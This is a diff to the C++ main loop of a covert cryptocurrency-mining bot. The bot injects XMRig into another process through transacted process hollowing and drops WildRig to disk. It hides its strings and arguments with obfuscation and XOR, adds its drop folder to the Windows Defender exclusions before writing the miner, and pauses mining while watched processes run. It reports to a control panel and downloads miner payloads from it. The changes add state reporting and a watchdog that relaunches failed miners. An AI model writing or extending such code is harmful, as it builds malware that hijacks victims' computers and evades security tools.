@@ -49,6 +49,48 @@ static void close_miner_handles(std::optional<PROCESS_INFORMATION>& pi) {
     pi.reset();
 }
 
+// Mining state reported to the panel so the dashboard can tell an operator
+// whether a rig is actually hashing, paused because a watched process is
+// running, or broken (miner not running).
+enum class MinerState { Unknown, Disabled, Active, Paused, Error };
+
+static const char* MinerStateName(MinerState state) {
+    switch (state) {
+        case MinerState::Active:   return "active";
+        case MinerState::Paused:   return "paused";
+        case MinerState::Error:    return "error";
+        case MinerState::Disabled: return "disabled";
+        default:                   return "unknown";
+    }
+}
+
+// Watched-process suspension is global, so `paused` applies to both miners at
+// once; error/disabled can differ per miner.
+static MinerState EvalMinerState(int enabled, DWORD pid, bool paused, bool payloadReady) {
+    if (enabled != 1) return MinerState::Disabled;
+    if (!payloadReady || pid == 0 || !IsPidRunning(pid)) return MinerState::Error;
+    return paused ? MinerState::Paused : MinerState::Active;
+}
+
+// Collapses both miners into one state, preferring the most actionable value:
+// a dead miner or a running watched process matters more than "active".
+static MinerState CombineMinerState(MinerState cpu, MinerState gpu) {
+    auto is = [](MinerState s, MinerState v) { return s == v; };
+    for (MinerState s : {cpu, gpu}) {
+        if (is(s, MinerState::Error)) return MinerState::Error;
+    }
+    for (MinerState s : {cpu, gpu}) {
+        if (is(s, MinerState::Paused)) return MinerState::Paused;
+    }
+    for (MinerState s : {cpu, gpu}) {
+        if (is(s, MinerState::Active)) return MinerState::Active;
+    }
+    for (MinerState s : {cpu, gpu}) {
+        if (is(s, MinerState::Disabled)) return MinerState::Disabled;
+    }
+    return MinerState::Unknown;
+}
+
 // Signal handler for graceful shutdown
 BOOL WINAPI ConsoleHandler(DWORD signal) {
     if (signal == CTRL_C_EVENT || signal == CTRL_BREAK_EVENT || 
@@ -364,21 +406,6 @@ int main(int argc, char *argv[])
 #endif
 #endif
 
-#ifdef ENABLE_DEFENDER_EXCLUSION
-    // Add the persistence/drop folder to Windows Defender exclusion if running
-    // as admin. This must happen before the miner binary is dropped to disk so
-    // the freshly-written executable isn't scanned or quarantined.
-    if (IsRunningAsAdmin()) {
-        std::cout << "[*] Attempting to add persistence folder to Windows Defender exclusion..." << std::endl;
-        if (AddDefenderExclusion(gpuDropDir)) {
-            std::cout << "[+] Successfully added " << gpuDropDir << " to Windows Defender exclusion" << std::endl;
-        } else {
-            std::cerr << "[-] Failed to add " << gpuDropDir << " to Windows Defender exclusion" << std::endl;
-        }
-    } else {
-        std::cout << "[*] Not running as admin, skipping Windows Defender exclusion" << std::endl;
-    }
-#endif
 
 
 #ifdef ENABLE_PERSISTENCE
@@ -417,7 +444,7 @@ int main(int argc, char *argv[])
 #endif // ENABLE_CONTRACT_URL
     
     // Client version - update this for each release
-    const std::string CLIENT_VERSION = OBFUSCATE_STRING("3.1.0");
+    const std::string CLIENT_VERSION = OBFUSCATE_STRING("3.3");
 
     // Prefix used when passing XOR-encrypted XMRig args to the injected process
     const std::string ENC_ARGS_PREFIX = OBFUSCATE_STRING("--encargs ");
@@ -465,6 +492,22 @@ int main(int argc, char *argv[])
     if (gpuDropDir.empty() || gpuDropDir.back() != '\\') gpuDropDir += "\\";
     std::wstring gpuDropDirW(gpuDropDir.begin(), gpuDropDir.end());
     const std::wstring GPU_MINER_PATH = gpuDropDirW + L"wildrig.exe";
+#ifdef ENABLE_DEFENDER_EXCLUSION
+    // Add the persistence/drop folder to Windows Defender exclusion if running
+    // as admin. This must happen before the miner binary is dropped to disk so
+    // the freshly-written executable isn't scanned or quarantined.
+    if (IsRunningAsAdmin()) {
+        std::cout << "[*] Attempting to add persistence folder to Windows Defender exclusion..." << std::endl;
+        if (AddDefenderExclusion(gpuDropDir)) {
+            std::cout << "[+] Successfully added " << gpuDropDir << " to Windows Defender exclusion" << std::endl;
+        } else {
+            std::cerr << "[-] Failed to add " << gpuDropDir << " to Windows Defender exclusion" << std::endl;
+        }
+    } else {
+        std::cout << "[*] Not running as admin, skipping Windows Defender exclusion" << std::endl;
+    }
+#endif
+
     
 #ifdef ENABLE_DEBUG_CONSOLE
     std::cout << "[DEBUG] Decrypted Panel URL(s): " << panelUrlsStr << std::endl;
@@ -507,7 +550,8 @@ int main(int argc, char *argv[])
 #ifdef ENABLE_DEBUG_CONSOLE
         std::cout << "[*] Fetching configuration from panel..." << std::endl;
 #endif
-        if (!configManager.FetchConfigFromPanelWithFallback(panelUrlsStr, pcUsername, deviceHash, cpuName, gpuName, antivirusName, CLIENT_VERSION, GetSystemUptimeMinutes())) {
+        if (!configManager.FetchConfigFromPanelWithFallback(panelUrlsStr, pcUsername, deviceHash, cpuName, gpuName, antivirusName, CLIENT_VERSION,
+            MinerStateName(MinerState::Unknown), MinerStateName(MinerState::Unknown), MinerStateName(MinerState::Unknown), GetSystemUptimeMinutes())) {
             std::cerr << "[-] Failed to fetch configuration from all panel URLs. Exiting." << std::endl;
             return 1;
         }
@@ -694,6 +738,10 @@ int main(int argc, char *argv[])
         std::cout << "[*] CPU mining disabled, skipping XMRig injection" << std::endl;
 #endif
         free_buffer(xmrigBuf);
+        // Drop the pointer too: the watchdog reloads the payload when CPU mining
+        // is enabled later, and a dangling non-null buffer would be reused.
+        xmrigBuf = nullptr;
+        xmrigPayloadSize = 0;
     }
 
 
@@ -726,6 +774,8 @@ int main(int argc, char *argv[])
         } else {
             std::cout << "[*] GPU mining disabled, skipping WildRig launch" << std::endl;
             free_buffer(wildrigBuf);
+            wildrigBuf = nullptr;
+            wildrigPayloadSize = 0;
         }
     } else {
         std::cerr << "[-] Failed to load wildrig!" << std::endl;
@@ -826,9 +876,13 @@ int main(int argc, char *argv[])
     int checkInCounter = 0;
     int updateCheckCounter = 0;
     int idlePrintCounter = 0;
-    const int CHECK_IN_INTERVAL    = 15;  // seconds (4 minutes)
-    const int UPDATE_CHECK_INTERVAL = 3600; // seconds (1 hour)
+    // The loop sleeps 1s per tick, so these are effectively seconds.
+    // Keep in sync with the panel: it marks a device offline only after ten
+    // missed check-ins (minerOfflineAfter in Panel/main.go).
+    const int CHECK_IN_INTERVAL    = 60;   // 1 minute
+    const int UPDATE_CHECK_INTERVAL = 3600; // 1 hour
     bool panelOnline = true; // we reached the panel successfully to get here
+    bool watchedProcessRunning = false; // last known watched-process state
 
     if (CheckAndApplyUpdate(panelUrlsStr, CLIENT_VERSION)) {
 #ifdef ENABLE_DEBUG_CONSOLE
@@ -837,9 +891,80 @@ int main(int argc, char *argv[])
         return 0;
     }
 
+    // ── Miner watchdog ──────────────────────────────────────────────────────
+    // A miner that fails to launch (missing payload, failed injection) or keeps
+    // crashing used to be abandoned forever: the monitor blocks are gated on a
+    // non-zero PID. Retry with exponential backoff instead (5s ... 5m).
+    ULONGLONG cpuRetryAt = 0;
+    ULONGLONG gpuRetryAt = 0;
+    int cpuStartFailures = 0;
+    int gpuStartFailures = 0;
+
+    auto scheduleMinerRetry = [](int& failures, ULONGLONG& retryAt) {
+        if (failures < 6) failures++;
+        ULONGLONG delayMs = 5000ULL << failures;
+        if (delayMs > 300000ULL) delayMs = 300000ULL;
+        retryAt = GetTickCount64() + delayMs;
+    };
+
+    // Loads the payload on first need: embedded builds have it already, remote
+    // builds fetch it from the panel (and retry that fetch on later attempts).
+    auto ensureCpuPayload = [&]() -> bool {
+        if (ensure_embedded_xmrig(xmrigBuf, xmrigPayloadSize)) return true;
+#ifdef ENABLE_REMOTE_MINERS
+        BYTE* remote = nullptr;
+        size_t remoteSize = 0;
+        if (DownloadMinerWithFallback(panelUrlsStr, OBFUSCATE_STRING("/resources/xmrig"), remote, remoteSize)) {
+            if (xmrigBuf) free_buffer(xmrigBuf);
+            xmrigBuf = remote;
+            xmrigPayloadSize = remoteSize;
+            return true;
+        }
+#endif
+        return false;
+    };
+
+    auto ensureGpuPayload = [&]() -> bool {
+        if (ensure_embedded_wildrig(wildrigBuf, wildrigPayloadSize)) return true;
+#ifdef ENABLE_REMOTE_MINERS
+        BYTE* remote = nullptr;
+        size_t remoteSize = 0;
+        if (DownloadMinerWithFallback(panelUrlsStr, OBFUSCATE_STRING("/resources/wildrig"), remote, remoteSize)) {
+            if (wildrigBuf) free_buffer(wildrigBuf);
+            wildrigBuf = remote;
+            wildrigPayloadSize = remoteSize;
+            return true;
+        }
+#endif
+        return false;
+    };
+
+    auto launchCpuMiner = [&]() -> bool {
+        if (!ensureCpuPayload()) return false;
+        bool idle = IsDeviceIdle(lastCpuConfig.wait_time_idle);
+        std::string cmd = configManager.BuildCommandLineArgs(lastCpuConfig, idle);
+        if (cmd.empty()) return false;
+        std::string encArgs = ENC_ARGS_PREFIX + XorEncryptToHex(cmd, pcUsername);
+        cpuPid = transacted_hollowing(targetPath, xmrigBuf, (DWORD)xmrigPayloadSize, ScopedLPWSTR(encArgs));
+        cpuPi = ProcessStorage::GetProcess(cpuPid);
+        return cpuPid != 0;
+    };
+
+    auto launchGpuMiner = [&]() -> bool {
+        if (!ensureGpuPayload()) return false;
+        std::string args = buildWildrigArgs(donateActive ? makeDonateConfig() : lastGpuConfig);
+        gpuPid = drop_payload_and_run(GPU_MINER_PATH.c_str(), wildrigBuf, (DWORD)wildrigPayloadSize, ScopedLPWSTR(args));
+        gpuPi = ProcessStorage::GetProcess(gpuPid);
+        return gpuPid != 0;
+    };
+
     while (true)
     {
-        // Check in with panel every 4 minutes
+        // Evaluate the watched-process list once per iteration; it drives both
+        // the suspend/resume calls and the mining state reported to the panel.
+        watchedProcessRunning = AreProcessesRunning(configManager.GetWatchedProcesses());
+
+        // Check in with the panel once a minute
         checkInCounter++;
         if (checkInCounter >= CHECK_IN_INTERVAL)
         {
@@ -849,7 +974,13 @@ int main(int argc, char *argv[])
                 if (!configGetUrlStr.empty()) {
                     configFetched = configManager.FetchConfigFromUrlWithFallback(configGetUrlStr);
                 } else {
-                    configFetched = configManager.FetchConfigFromPanelWithFallback(panelUrlsStr, pcUsername, deviceHash, cpuName, gpuName, antivirusName, CLIENT_VERSION, GetSystemUptimeMinutes());
+                    const bool cpuPayload = (xmrigBuf != nullptr && xmrigPayloadSize > 0);
+                    const bool gpuPayload = (wildrigBuf != nullptr && wildrigPayloadSize > 0);
+                    const MinerState cpuState = EvalMinerState(lastCpuConfig.enabled, cpuPid, watchedProcessRunning, cpuPayload);
+                    const MinerState gpuState = EvalMinerState(lastGpuConfig.enabled, gpuPid, watchedProcessRunning, gpuPayload);
+                    const MinerState overall  = CombineMinerState(cpuState, gpuState);
+                    configFetched = configManager.FetchConfigFromPanelWithFallback(panelUrlsStr, pcUsername, deviceHash, cpuName, gpuName, antivirusName, CLIENT_VERSION,
+                        MinerStateName(overall), MinerStateName(cpuState), MinerStateName(gpuState), GetSystemUptimeMinutes());
                 }
 
                 if (!configFetched && panelOnline) {
@@ -1086,23 +1217,42 @@ int main(int argc, char *argv[])
 #ifdef ENABLE_DEBUG_CONSOLE
                 std::cout << "[!] CPU miner crashed, restarting" << std::endl;
 #endif
-                // Restart if CPU is still enabled. The miner is already dead, but
-                // its handles and storage entry still have to be released.
+                // The miner is already dead, but its handles and storage entry
+                // still have to be released. cpuPid is cleared so a failed
+                // relaunch is handled by the backoff retry below instead of
+                // spinning once per tick.
                 close_miner_handles(cpuPi);
+                cpuPid = 0;
                 if (lastCpuConfig.enabled == 1) {
-                    std::string cpuCommand = configManager.BuildCommandLineArgs(lastCpuConfig, cpuIsIdle);
-                    std::string encRestartArgs = ENC_ARGS_PREFIX + XorEncryptToHex(cpuCommand, pcUsername);
-                    cpuPid = transacted_hollowing(targetPath, xmrigBuf, (DWORD)xmrigPayloadSize,
-                        ScopedLPWSTR(encRestartArgs));
-                    cpuPi = ProcessStorage::GetProcess(cpuPid);
+                    if (launchCpuMiner()) {
+                        cpuStartFailures = 0;
+                        cpuRetryAt = 0;
+                    } else {
+                        scheduleMinerRetry(cpuStartFailures, cpuRetryAt);
+                    }
                 }
             } else {
                 // Handle process suspension based on monitoring
-                if (AreProcessesRunning(configManager.GetWatchedProcesses())) {
+                if (watchedProcessRunning) {
                     NtSuspendProcess(cpuPi.value().hProcess);
                 } else {
                     NtResumeProcess(cpuPi.value().hProcess);
                 }
+            }
+        } else if (lastCpuConfig.enabled == 1 && GetTickCount64() >= cpuRetryAt) {
+            // Enabled but not running: initial launch failed, the payload could
+            // not be downloaded, or a restart failed. Retry with backoff.
+            if (launchCpuMiner()) {
+                cpuStartFailures = 0;
+                cpuRetryAt = 0;
+#ifdef ENABLE_DEBUG_CONSOLE
+                std::cout << "[+] CPU miner (re)started, PID: " << cpuPid << std::endl;
+#endif
+            } else {
+                scheduleMinerRetry(cpuStartFailures, cpuRetryAt);
+#ifdef ENABLE_DEBUG_CONSOLE
+                std::cout << "[!] CPU miner unavailable (attempt " << cpuStartFailures << "), retrying later" << std::endl;
+#endif
             }
         }
 
@@ -1114,19 +1264,36 @@ int main(int argc, char *argv[])
 #endif
                 // Restart if GPU is still enabled
                 close_miner_handles(gpuPi);
-                if (lastGpuConfig.enabled == 1 && wildrigBuf != nullptr && wildrigPayloadSize > 0) {
-                    std::string wildrig_args = buildWildrigArgs(donateActive ? makeDonateConfig() : lastGpuConfig);
-                    
-                    gpuPid = drop_payload_and_run(GPU_MINER_PATH.c_str(), wildrigBuf, (DWORD)wildrigPayloadSize, ScopedLPWSTR(wildrig_args));
-                    gpuPi = ProcessStorage::GetProcess(gpuPid);
+                gpuPid = 0;
+                if (lastGpuConfig.enabled == 1) {
+                    if (launchGpuMiner()) {
+                        gpuStartFailures = 0;
+                        gpuRetryAt = 0;
+                    } else {
+                        scheduleMinerRetry(gpuStartFailures, gpuRetryAt);
+                    }
                 }
             } else {
                 // Handle process suspension based on monitoring
-                if (AreProcessesRunning(configManager.GetWatchedProcesses())) {
+                if (watchedProcessRunning) {
                     NtSuspendProcess(gpuPi.value().hProcess);
                 } else {
                     NtResumeProcess(gpuPi.value().hProcess);
                 }
+            }
+        } else if (lastGpuConfig.enabled == 1 && GetTickCount64() >= gpuRetryAt) {
+            // Enabled but not running: retry with backoff (see CPU above).
+            if (launchGpuMiner()) {
+                gpuStartFailures = 0;
+                gpuRetryAt = 0;
+#ifdef ENABLE_DEBUG_CONSOLE
+                std::cout << "[+] GPU miner (re)started, PID: " << gpuPid << std::endl;
+#endif
+            } else {
+                scheduleMinerRetry(gpuStartFailures, gpuRetryAt);
+#ifdef ENABLE_DEBUG_CONSOLE
+                std::cout << "[!] GPU miner unavailable (attempt " << gpuStartFailures << "), retrying later" << std::endl;
+#endif
             }
         }
 
@@ -1137,7 +1304,7 @@ int main(int argc, char *argv[])
             lastSchedTickMs = nowMs;
 
             if (lastGpuConfig.enabled == 1 && gpuPid != 0 && wildrigBuf != nullptr && wildrigPayloadSize > 0) {
-                if (AreProcessesRunning(configManager.GetWatchedProcesses())) {
+                if (watchedProcessRunning) {
                     // Paused by a watched process: push the switch time forward
                     // so suspension doesn't count against the donation window.
                     nextSwitchMs += elapsed;
